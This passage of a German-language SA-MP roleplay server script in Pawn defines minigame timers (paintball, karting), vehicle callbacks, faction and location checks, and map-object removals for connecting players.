	            ServerWeapon(i, 29, 999);
	            UnFreezePlayer(i);
	            SendClientMessage(i, COLOR_YELLOW, "Paintball gestartet. 4 Minuten verbleibend.");
	            PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
	        }
	    }
	}
	SetTimer("PaintballEnded", 240000, 0);
	return 1;
}
Function PaintballEnded()
{
	new string[256];
	new name[MAX_PLAYER_NAME];
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(PlayerPaintballing[i] != 0)
	        {
	            if(IsPlayerConnected(PaintballWinner))
	            {
	                GetPlayerName(PaintballWinner, name, sizeof(name));
	                format(string,sizeof(string), "** %s hat das Paintballspiel mit %d Treffern gewonnen **",name,PaintballWinnerKills);
	                SendClientMessage(i, COLOR_WHITE, string);
	                SetTimer("Ende", 2000, 0);
	            }
	            ResetPlayerWeapons(i);
	            PlayerPaintballing[i] = 0;
	            SetPlayerPos(i, BizzInfo[43][bEntranceX],BizzInfo[43][bEntranceY],BizzInfo[43][bEntranceZ]);
				SetPlayerInterior(i, 0);
				SetPlayerVirtualWorld(i, 0);
	        }
		}
	}
	AnnouncedPaintballRound = 0;
    PaintballRound = 0;
	return 1;
}
Function PrepareKarting()
{
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
	        {
	            CP[i] = 9;
				SetPlayerCheckpoint(i,2308.3540,-2354.0039,12.6842,8.0);
				SendClientMessage(i, COLOR_YELLOW, "Kart Rennen startet in 20 sekunden,geh zur Startlinie.");
	        }
		}
	}
	SetTimer("StartKarting", 20000, 0);
	return 1;
}
Function StartKarting()
{
	KartingRound = 1;
	StartingKartRound = 0;
	EndingKartRound = 0;
	FirstKartWinner = 999;
	SecondKartWinner = 999;
	ThirdKartWinner = 999;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
	        {
	            CP[i] = 10;
	            SendClientMessage(i, COLOR_YELLOW, "Los, Los, Los!");
	            PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
	            SetPlayerCheckpoint(i,2308.3540,-2354.0039,12.6842,8.0);
	        }
	    }
	}
	SetTimer("KartingEnded", 240000, 0);
	return 1;
}
Function KartingEnded()
{
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
	        {
	            CP[i] = 0;
	            DisablePlayerCheckpoint(i);
	        }
		}
	}
	AnnouncedKartRound = 0;
    KartingRound = 0;
	return 1;
}
Function DollahScoreUpdate()
{
	new LevScore;
	for(new i=0; i<MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
   			LevScore = PlayerInfo[i][pLevel];
			SetPlayerScore(i, LevScore);
		}
	}
	return 1;
}
Function Encrypt(string[])
{
	for(new x=0; x < strlen(string); x++)
	  {
		  string[x] += (3^x) * (x % 15);
		  if(string[x] > (0xff))
		  {
			  string[x] -= 256;
		  }
	  }
	return 1;
}
stock strget(strx[], pos, search = ' ') {
new arg, ret[128], idxx;
for (new i = 0; i < strlen(strx); i++) {
if(strx[i] == search || i == strlen(strx) || strx[i + 1] == 10) {
arg++;
if (arg == pos + 1){
ret[i-idxx] = EOS;
return ret;
} else if (arg == pos)
idxx= i+1;
}
else if (arg == pos)
        ret[i - idxx] = strx[i];
}
return ret;
}


stock AddNagelBand(playerid) {
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	for(new i = 0; i < sizeof(NagelBand); i++) {
  	    if(NagelBand[i][nErstellt] == 0) {
			NagelBand[i][NagelBandX] = x;
		    NagelBand[i][NagelBandY] = y;
		    NagelBand[i][NagelBandZ] = z - 0.7;
		    NagelBand[i][nErstellt] = 1;
		    NagelBand[i][ID] = CreateDynamicObject(2899, x, y, z - 0.7, 0.0, 0.0, a - 90.0);
		    return 1;
		}
	}
	return 0;
}



stock RemoveNagelBand(playerid)
{
   	for(new i = 0; i < sizeof(NagelBand); i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3, NagelBand[i][NagelBandX], NagelBand[i][NagelBandY], NagelBand[i][NagelBandZ]))
		{
			if(NagelBand[i][nErstellt] == 1)
			{
				NagelBand[i][nErstellt] = 0;
    			NagelBand[i][NagelBandX] = 0.0;
		        NagelBand[i][NagelBandY] = 0.0;
	         	NagelBand[i][NagelBandZ] = 0.0;
           		DestroyDynamicObject(NagelBand[i][ID]);
           		SendClientMessage(playerid, COLOR_LIGHTGREEN, "Nagelband abggebaut!");
           		NagelBandErstellt[playerid] = 0;
             	return 1;
  	        }
  	    }
  	}
   	return 0;
}
stock RemoveAllNagelBand() {
   	for(new i = 0; i < sizeof(NagelBand); i++) {
		if(NagelBand[i][nErstellt] == 1) {
			NagelBand[i][nErstellt] = 0;
			NagelBand[i][NagelBandX] = 0.0;
   			NagelBand[i][NagelBandY] = 0.0;
     		NagelBand[i][NagelBandZ] = 0.0;
    		DestroyDynamicObject(NagelBand[i][ID]);
  	    }
  	}
   	return 0;
}
stock CountNagelBand() {
   	new anzahl = 0;
	for(new i = 0; i < sizeof(NagelBand); i++) {
		if(NagelBand[i][nErstellt] == 1) anzahl++;
  	}
   	return anzahl;
}

encode_tires(tires1, tires2, tires3, tires4) {

	return tires1 | (tires2 << 1) | (tires3 << 2) | (tires4 << 3);

}

//------------------------------------------------------------------------------------------------------

Function OnPlayerExitVehicle(playerid, vehicleid)
{




	if (GetPlayerState(playerid) == 1)
	{
		return 1;
	}
	if(gGas[playerid] == 1)
	{
	    GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~Auto Verlassen", 500, 3);
	}
	if(GetVehicleModel(vehicleid) == 408)
    {
		if(Mullabfuhr[playerid] == 1)
		{
			SendClientMessage(playerid, COLOR_RED, "* Du hast 15 Sekunden um in einen Muellwagen zu steigen !");
			SetTimerEx("MullabfuhrAbbruch", 15000, 0,"i",playerid);
		}
    }
	return 1;
}

Function OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{







/*
	if(IsADtCar(vehicleid))// Privatfahrzeug
	{
		new carowner = GetDtCarOwner(vehicleid);
		new slot = GetDtCarOwnerSlot(carowner,vehicleid);

		PlayMusic(playerid,PlayerCar[carowner][slot][SoundSystemData]);
    	TextDrawShowForPlayer(playerid, Textdrawaisahuso[playerid]);

	}
*/



	if(GetVehicleModel(vehicleid) == 515 && ispassenger != 1)
	{
        if(PlayerInfo[playerid][sMember] == 10)
        {
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Mit diesem Fahrzeug kannst du Pakete aus Las Venturas abholen!.");
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Diese kannst du an verschiedenen Bizen Verkaufen!.");
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Befehle: /petrol, Dir wurde ein Marker gesetzt! Viel Spaß!");
        SetPlayerCheckpoint(playerid,-1280.7585,2719.8538,50.0625,8.0);
		}
	}
	if(IsANoTachoVehicle(vehicleid) || IsPlayerNPC(playerid))
	{
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
	}
	if(GetVehicleModel(vehicleid) == 548 && ispassenger == 1)
    {
	    PutPlayerInVehicle(playerid, vehicleid, 1);
	    TogglePlayerControllable(playerid, 1);
	    InCargo[playerid] = vehicleid;
    }
   	if(GetVehicleModel(vehicleid) == 417 && ispassenger == 1)
    {
	    PutPlayerInVehicle(playerid, vehicleid, 1);
	    TogglePlayerControllable(playerid, 1);
	    InLevi[playerid] = vehicleid;
    }
    if(GetVehicleModel(vehicleid) == 427 && ispassenger == 1)
    {
        PutPlayerInVehicle(playerid, vehicleid, 1);
        TogglePlayerControllable(playerid, 1);
        InEnfo[playerid] = vehicleid;
	}
 	if(GetVehicleModel(vehicleid) == 532 && ispassenger != 1 && PlayerInfo[playerid][pJob] == 6)
 	{
 	    SendClientMessage(playerid, COLOR_GRAD1, "Um die Felder zu ernten, tippe /ernten.");
	}
	return 1;
}
Function IsAnInstructor(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader];
	    new member = PlayerInfo[playerid][pMember];
	    if(member==11)
		{
		    return 1;
		}
		if(leader==11)
		{
		    return 1;
		}
	}
	return 0;
}

Function IsAMember(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader];
	    new member = PlayerInfo[playerid][pMember];
	    if(member==5 || member==6 || member==8 || member==12 || member==13 || member==14 || member==14 || member==16 || member==17 || member==18 || member==19 || member==20 || member==21 || member==22 || member==23 || member==24)
		{
		    return 1;
		}
		if(leader==5 || leader==6 || leader==8 || leader==12 || leader==13 || leader==14 || leader==15 || leader==16 || leader==17 || leader==18 || leader==19 || leader==20 || leader==21 || leader==22 || leader==23 || leader==24)
		{
		    return 1;
		}
	}
	return 0;
}
Function IsADChatter(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader];
	    new member = PlayerInfo[playerid][pMember];
	    if(member==1||member==2||member==3||member==4||member==21||member==22||member==24||member==15||leader==1||leader==2||leader==3||leader==4||leader==7||leader==21||leader==22||leader==24||leader==15)
		{
		    return 1;
		}
		else if(PlayerInfo[playerid][pMember] == 7)
		{
		    return 1;
		}
	}
	return 0;
}
Function SendLeaderMessage(leader, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pLeader] == leader)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}
Function IsACop(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader];
	    new member = PlayerInfo[playerid][pMember];
	    if(member==1 || member==2 || member==22 || member==3)
		{
		    return 1;
		}
		else if(leader==1 || leader==2 || leader==22 || leader==3)
		{
		    return 1;
		}
	}
	return 0;
}
Function IsAtClothShop(playerid)
{
    if(IsPlayerConnected(playerid))
	{
        if(IsPlayerInRangeOfPoint(playerid,30.0,207.5627,-103.7291,1005.2578) || IsPlayerInRangeOfPoint(playerid,30.0,203.9068,-41.0728,1001.8047))
		{//Binco & Suburban
			return 1;
  		}
		else if(IsPlayerInRangeOfPoint(playerid,30.0,214.4470,-7.6471,1001.2109) || IsPlayerInRangeOfPoint(playerid,30.0,161.3765,-83.8416,1001.8047))
		{//Zip & Victim
  		  return 1;
		}
	}
	return 0;
}

Function IsAtFishPlace(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(IsPlayerInRangeOfPoint(playerid,1.0,403.8266,-2088.7598,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,398.7553,-2088.7490,7.8359))
		{//Fishplace at the bigwheel
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,396.2197,-2088.6692,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,391.1094,-2088.7976,7.8359))
		{//Fishplace at the bigwheel
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,383.4157,-2088.7849,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,374.9598,-2088.7979,7.8359))
		{//Fishplace at the bigwheel
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,369.8107,-2088.7927,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,367.3637,-2088.7925,7.8359))
		{//Fishplace at the bigwheel
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,362.2244,-2088.7981,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,354.5382,-2088.7979,7.8359))
		{//Fishplace at the bigwheel
		    return 1;
		}
	}
	return 0;
}


Function IsAtCookPlace(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(IsPlayerInRangeOfPoint(playerid,3.0,369.9786,-4.0798,1001.8589))
	    {//Cluckin Bell
	        return 1;
	    }
	    else if(IsPlayerInRangeOfPoint(playerid,3.0,376.4466,-60.9574,1001.5078) || IsPlayerInRangeOfPoint(playerid,3.0,378.1215,-57.4928,1001.5078))
		{//Burgershot
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,374.1185,-113.6361,1001.4922) || IsPlayerInRangeOfPoint(playerid,3.0,377.7971,-113.7668,1001.4922))
		{//Well Stacked Pizza
		    return 1;
		}
	}
	return 0;
}
Function IsAtBar(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pLocal] == 99 || PlayerInfo[playerid][pLocal] == 100)
		{
		    return 1;
		}
		if(IsPlayerInRangeOfPoint(playerid, 10.0, 1251.6099,-1640.3866,13.5469))
		{
		    return 1;
		}
		if(IsPlayerInRangeOfPoint(playerid, 10.0, -2659.0623,1410.4218,910.1703))
		{
		    return 1;
		}
		if(IsPlayerInRangeOfPoint(playerid, 10.0, 499.4521,-20.6484,1000.6797))
		{
		    return 1;
		}
		if(IsPlayerInRangeOfPoint(playerid, 25.0, 496.4293,-75.6149,998.7578))
		{
		    return 1;
		}
	}
	return 0;
}

Function IsAtRep(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid,4.0,796.9246,-2102.7170,12.6823) || IsPlayerInRangeOfPoint(playerid,4.0,1196.0211,-1351.2733,13.4017) || IsPlayerInRangeOfPoint(playerid,4.0,1547.5663,-1610.0396,13.3828) || IsPlayerInRangeOfPoint(playerid,4.0,-1628.6464,652.0121,7.1875) ||IsPlayerInRangeOfPoint(playerid,4.0,1244.3359,-2042.6630,59.8744) ||IsPlayerInRangeOfPoint(playerid,4.0,2668.9263,-2639.5989,2.1344) ||IsPlayerInRangeOfPoint(playerid,4.0,975.3781,-1446.9520,13.0599))
	{
	    return 1;
	}
	if(IsPlayerInRangeOfPoint(playerid,4.0,-1407.8838,507.2498,18.2344) || IsPlayerInRangeOfPoint(playerid,4.0,-1234.6599,473.8205,7.1875) || IsPlayerInRangeOfPoint(playerid, 4.0, 1692.5320,-1539.5343,13.5469) || IsPlayerInRangeOfPoint(playerid, 4.0, 1571.3887,-1705.3455,28.3948) || IsPlayerInRangeOfPoint(playerid, 4.0, 1007.9469,1154.9111,10.7402) ||IsPlayerInRangeOfPoint(playerid,4.0,2758.9431,-2393.5806,13.6328))
	{
	    return 1;
	}
	return 0;
}

Function IsABoat(carid)
{
	for(new i = 0; i < sizeof(HafenKlause); i++)
	{
	    if(carid == HafenKlause[i])
	    {
			return 1;
 		}
	}
	return 0;
}
Function IsAPlane(carid)
{
	new model = GetVehicleModel(carid);
  	if(model == 425 || model == 497 || model == 520)
   	{
		return 1;
	}
	return 0;
}
Function IsA2Turer(carid)
{
	new m = GetVehicleModel(carid);
	if(m == 401 || m == 410 || m == 419 || m == 436 || m == 439 || m == 474 || m == 491 || m == 496 || m == 517 || m == 518 || m == 526 || m == 527 || m == 533 || m == 545 || m == 549 || m == 580 || m == 589 || m == 600 || m == 602 || m == 411 || m == 415 || m == 429 || m == 451 || m == 477 || m == 480 || m == 506 || m == 541 || m == 555 || m == 412 || m == 534 || m == 535 || m == 536 || m == 575 || m == 576)
	{
	    return 1;
	}
	return 0;
}
Function IsANoTachoVehicle(carid)
{
	new model = GetVehicleModel(carid);
	{
	    if(model == 481 || model == 509 || model == 510)
	    {
			return 1;
		}
	}
	return 0;
}
Function IsANoLicVehicle(carid)
{
	new modelid = GetVehicleModel(carid);
	if(modelid == 462 || modelid == 509 || modelid == 481 || modelid == 510)
	{
		return 1;
	}
	return 0;
}
Function IsATaxi(carid)
{
	new modelid = GetVehicleModel(carid);
	if(modelid == 420 || modelid == 438)
	{
	    return 1;
	}
	return 0;
}
Function IsABus(carid)
{
	new modelid = GetVehicleModel(carid);
	if(modelid == 431 || modelid == 437)
	{
	    return 1;
	}
	return 0;
}
Function IsANewbie(carid)
{
	new model = GetVehicleModel(carid);
	if(model==509||model==481||model==510||model==448)
	{
		return 1;
	}
	return 0;
}
Function IsABike(carid)
{
	new model = GetVehicleModel(carid);
	if(model==461||model==463||model==468||model==521||model==522||model==581||model==586)
	{
		return 1;
	}
	return 0;
}
Function IsARoller(carid)
{
	new model = GetVehicleModel(carid);
	if(model ==462)
	{
	    return 1;
	}
	return 0;
}
Function IsALKW(carid)
{
	new model = GetVehicleModel(carid);
	if(model==403||model==406||model==486||model==514||model==515||model==573||model==578)
	{
		return 1;
	}
	return 0;
}
Function FarmerFahrzeug(carid)
{
	for(new i = 0; i < sizeof(FarmFahrzeug); i++)
   	{
		if(carid == FarmFahrzeug[i])
  		{
        	return 1;
  		}
   	}
   	return 0;
}
Function IsAnAmbulance(carid)
{
	new model = GetVehicleModel(carid);
	if(model==416||model==563||model==598||model==560)
	{
		return 1;
	}
	return 0;
}

Function IsATruck(carid)
{
	for(new i = 0; i < sizeof(Truck); i++)
	{
		if(carid == Truck[i])
		{
		    return 1;
		}
	}
	return 0;
}
//------------------------------------------------------------------------------------------------------
Function OnPlayerConnect(playerid)
{





	if(IsPlayerNPC(playerid))
	{
		SpawnPlayer(playerid);
	    return 1;
	}
	//SendClientMessageToAll(-1,"GEHT /AUFTRÄGE MIT MEHREREN PERSONEN ? DAS IST HIER DIE FRAGE DU HURENSOHN");
RemoveBuildingForPlayer(playerid, 620, 1547.5703, -1689.9844, 13.0469, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1547.5703, -1661.0313, 13.0469, 0.25);

	RemoveBuildingForPlayer(playerid, 5766, 1160.96, -1180.58, 70.4141, 250.0); // Awning shadows
	RemoveBuildingForPlayer(playerid, 5767, 1160.96, -1180.58, 70.4141, 250.0); // Building
	RemoveBuildingForPlayer(playerid, 5964, 1160.96, -1180.58, 70.4141, 250.0); // LOD
    // Remove the lamp post at the underground car park entrance
    RemoveBuildingForPlayer(playerid, 1226, 265.481, -1581.1, 32.9311, 5.0);

    // Remove the night lights object (must be removed to also remove any
    // occulsion zones inside the building)
    RemoveBuildingForPlayer(playerid, 6518, 280.297, -1606.2, 72.3984, 250.0);

// Labor (removed)

//









	// Exit here (return 1 so this callback is processed in other scripts)
/*
// FBI Base
RemoveBuildingForPlayer(playerid, 4024, 1479.8672, -1790.3984, 56.0234, 0.25);
RemoveBuildingForPlayer(playerid, 4044, 1481.1875, -1785.0703, 22.3828, 0.25);
RemoveBuildingForPlayer(playerid, 4045, 1479.3359, -1802.2891, 12.5469, 0.25);
RemoveBuildingForPlayer(playerid, 4046, 1479.5234, -1852.6406, 24.5156, 0.25);
RemoveBuildingForPlayer(playerid, 4047, 1531.6328, -1852.6406, 24.5156, 0.25);
RemoveBuildingForPlayer(playerid, 1527, 1448.2344, -1755.8984, 14.5234, 0.25);
RemoveBuildingForPlayer(playerid, 4217, 1449.2500, -1852.5703, 22.3672, 0.25);
RemoveBuildingForPlayer(playerid, 713, 1407.1953, -1749.3125, 13.0938, 0.25);
RemoveBuildingForPlayer(playerid, 1266, 1482.0859, -1859.9688, 25.0391, 0.25);
RemoveBuildingForPlayer(playerid, 713, 1405.2344, -1821.1172, 13.1016, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1417.9766, -1832.5313, 11.9844, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1405.5781, -1831.6953, 12.3984, 0.25);
RemoveBuildingForPlayer(playerid, 1265, 1465.4766, -1848.2500, 12.9922, 0.25);
RemoveBuildingForPlayer(playerid, 1372, 1466.9453, -1847.8438, 12.6641, 0.25);
RemoveBuildingForPlayer(playerid, 1372, 1419.7344, -1846.5469, 12.6641, 0.25);
RemoveBuildingForPlayer(playerid, 1265, 1420.4297, -1845.3438, 12.9844, 0.25);
RemoveBuildingForPlayer(playerid, 1372, 1419.6953, -1844.2031, 12.6641, 0.25);
RemoveBuildingForPlayer(playerid, 1220, 1420.4922, -1842.4375, 12.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1220, 1419.7266, -1842.8516, 12.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1230, 1419.6719, -1842.0313, 12.9766, 0.25);
RemoveBuildingForPlayer(playerid, 4170, 1433.9531, -1844.4063, 21.4219, 0.25);
RemoveBuildingForPlayer(playerid, 700, 1447.1016, -1832.5000, 12.9141, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 1432.3047, -1832.9141, 15.2891, 0.25);
RemoveBuildingForPlayer(playerid, 4174, 1435.7656, -1823.6641, 15.1797, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1456.3984, -1832.5313, 11.9844, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1464.0938, -1831.8828, 12.3984, 0.25);
RemoveBuildingForPlayer(playerid, 1260, 1482.0859, -1859.9688, 25.0391, 0.25);
RemoveBuildingForPlayer(playerid, 4004, 1479.5234, -1852.6406, 24.5156, 0.25);
RemoveBuildingForPlayer(playerid, 1357, 1487.6953, -1848.1094, 12.8125, 0.25);
RemoveBuildingForPlayer(playerid, 1372, 1486.2109, -1848.1250, 12.6641, 0.25);
RemoveBuildingForPlayer(playerid, 1372, 1468.0625, -1847.7891, 12.6641, 0.25);
RemoveBuildingForPlayer(playerid, 1230, 1488.9219, -1848.2734, 12.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 1480.0313, -1832.9141, 15.2891, 0.25);
RemoveBuildingForPlayer(playerid, 3997, 1479.3359, -1802.2891, 12.5469, 0.25);
RemoveBuildingForPlayer(playerid, 4171, 1503.3984, -1848.3359, 21.4609, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1504.8438, -1832.5313, 11.9844, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1499.0469, -1832.2734, 12.8828, 0.25);
RemoveBuildingForPlayer(playerid, 1265, 1515.3828, -1850.0547, 12.9844, 0.25);
RemoveBuildingForPlayer(playerid, 1265, 1514.4219, -1850.0391, 12.9922, 0.25);
RemoveBuildingForPlayer(playerid, 700, 1512.9453, -1832.3516, 13.4688, 0.25);
RemoveBuildingForPlayer(playerid, 1372, 1516.6875, -1850.0547, 12.6641, 0.25);
RemoveBuildingForPlayer(playerid, 700, 1404.9141, -1765.2656, 12.9141, 0.25);
RemoveBuildingForPlayer(playerid, 4173, 1427.2734, -1756.1797, 15.0000, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1415.3125, -1748.5625, 12.3984, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1429.5313, -1748.4219, 12.9063, 0.25);
RemoveBuildingForPlayer(playerid, 700, 1438.0313, -1747.9375, 13.4453, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1447.9063, -1748.2266, 12.9063, 0.25);
RemoveBuildingForPlayer(playerid, 4002, 1479.8672, -1790.3984, 56.0234, 0.25);
RemoveBuildingForPlayer(playerid, 3980, 1481.1875, -1785.0703, 22.3828, 0.25);
RemoveBuildingForPlayer(playerid, 4003, 1481.0781, -1747.0313, 33.5234, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1516.0000, -1748.6016, 13.0078, 0.25);
RemoveBuildingForPlayer(playerid, 4048, 1531.6328, -1852.6406, 24.5156, 0.25);
RemoveBuildingForPlayer(playerid, 1372, 1538.9453, -1849.2734, 12.6641, 0.25);
RemoveBuildingForPlayer(playerid, 1230, 1538.8359, -1847.6250, 13.6719, 0.25);
RemoveBuildingForPlayer(playerid, 1220, 1538.3906, -1847.9297, 12.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1220, 1539.1016, -1847.2969, 12.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 1529.2891, -1832.9141, 15.2891, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1549.5313, -1832.3125, 12.8828, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1555.6641, -1830.5938, 13.0234, 0.25);
RemoveBuildingForPlayer(playerid, 4175, 1524.4141, -1823.8516, 15.1797, 0.25);
RemoveBuildingForPlayer(playerid, 700, 1554.8203, -1816.1563, 13.4766, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1553.2578, -1764.8125, 12.7969, 0.25);
RemoveBuildingForPlayer(playerid, 4172, 1534.7656, -1756.1797, 15.0000, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1533.2656, -1749.0234, 12.8047, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1522.1641, -1748.5703, 13.0234, 0.25);
RemoveBuildingForPlayer(playerid, 700, 1553.7031, -1747.9375, 13.4063, 0.25);
//

*/

    AddPlayer(playerid);
	WohnwagenID[playerid] = 0;
	isInWohnwagen[playerid] = 0;
// LSPD Kacke

DeathIconErstellt[playerid] = 0;

	mapicons[playerid]= 0;


/*
RemoveBuildingForPlayer(playerid, 4163, 1469.3359, -1732.2891, 12.4609, 0.25);
RemoveBuildingForPlayer(playerid, 4164, 1469.3359, -1732.2891, 12.4609, 0.25);


RemoveBuildingForPlayer(playerid, 4149, 1427.0547, -1662.2891, 12.4609, 0.25);
RemoveBuildingForPlayer(playerid, 4148, 1427.0547, -1662.2891, 12.4609, 0.25);


RemoveBuildingForPlayer(playerid, 4039, 1479.5547, -1592.2891, 12.4531, 0.25);
RemoveBuildingForPlayer(playerid, 3994, 1479.5547, -1592.2891, 12.4531, 0.25);
*/




// HatShop
RemoveBuildingForPlayer(playerid, 4215, 1777.5547, -1775.0391, 36.7500, 0.25);
RemoveBuildingForPlayer(playerid, 5059, 1841.1094, -1856.0469, 14.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1412, 1834.3125, -1879.5547, 13.6797, 0.25);
RemoveBuildingForPlayer(playerid, 1412, 1839.5859, -1879.5547, 13.6797, 0.25);
RemoveBuildingForPlayer(playerid, 1412, 1844.8672, -1879.5547, 13.6797, 0.25);
RemoveBuildingForPlayer(playerid, 1412, 1850.1406, -1879.5547, 13.6797, 0.25);
RemoveBuildingForPlayer(playerid, 1412, 1855.4141, -1879.5547, 13.6797, 0.25);
RemoveBuildingForPlayer(playerid, 5043, 1843.3672, -1856.3203, 13.8750, 0.25);
RemoveBuildingForPlayer(playerid, 5042, 1850.5703, -1855.6797, 14.3672, 0.25);
RemoveBuildingForPlayer(playerid, 1413, 1864.1797, -1879.6641, 13.6797, 0.25);
RemoveBuildingForPlayer(playerid, 4983, 1961.0313, -1871.4063, 23.7734, 0.25);
//
// SWAT
RemoveBuildingForPlayer(playerid, 8544, 2844.2500, 874.7188, 15.4453, 0.25);
RemoveBuildingForPlayer(playerid, 8549, 2836.0938, 928.2813, 11.3672, 0.25);
RemoveBuildingForPlayer(playerid, 8737, 2814.3438, 993.8438, 13.1406, 0.25);
RemoveBuildingForPlayer(playerid, 8738, 2867.9766, 976.5078, 14.7422, 0.25);
RemoveBuildingForPlayer(playerid, 8739, 2844.2500, 874.7188, 15.4453, 0.25);
RemoveBuildingForPlayer(playerid, 8960, 2787.0000, 953.4375, 13.2500, 0.25);
RemoveBuildingForPlayer(playerid, 8961, 2797.6250, 885.4531, 13.2500, 0.25);
RemoveBuildingForPlayer(playerid, 8962, 2797.6250, 865.4063, 13.2500, 0.25);
RemoveBuildingForPlayer(playerid, 8963, 2885.5313, 919.2266, 13.2500, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2806.2109, 838.6094, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2866.0313, 838.6094, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1365, 2801.0703, 858.1016, 10.8516, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2782.6641, 851.7656, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1358, 2808.7969, 857.2031, 10.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1343, 2821.8750, 858.1875, 10.4844, 0.25);
RemoveBuildingForPlayer(playerid, 1365, 2848.4844, 857.1797, 10.8516, 0.25);
RemoveBuildingForPlayer(playerid, 1343, 2836.9531, 858.1953, 10.4844, 0.25);
RemoveBuildingForPlayer(playerid, 1344, 2879.0859, 858.1563, 10.5391, 0.25);
RemoveBuildingForPlayer(playerid, 1358, 2863.7891, 857.2031, 10.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2889.7344, 851.7656, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2782.6641, 899.2813, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2800.9453, 879.3047, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2800.9453, 876.6406, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 8886, 2797.6250, 865.4063, 13.2500, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2806.6094, 892.3828, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 8885, 2797.6250, 885.4531, 13.2500, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2887.3047, 871.9141, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2887.3047, 874.5781, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2889.6172, 895.2109, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2782.6641, 929.2969, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 3458, 2818.4609, 928.6484, 11.2422, 0.25);
RemoveBuildingForPlayer(playerid, 8883, 2885.5313, 919.2266, 13.2500, 0.25);
RemoveBuildingForPlayer(playerid, 8884, 2787.0000, 953.4375, 13.2500, 0.25);
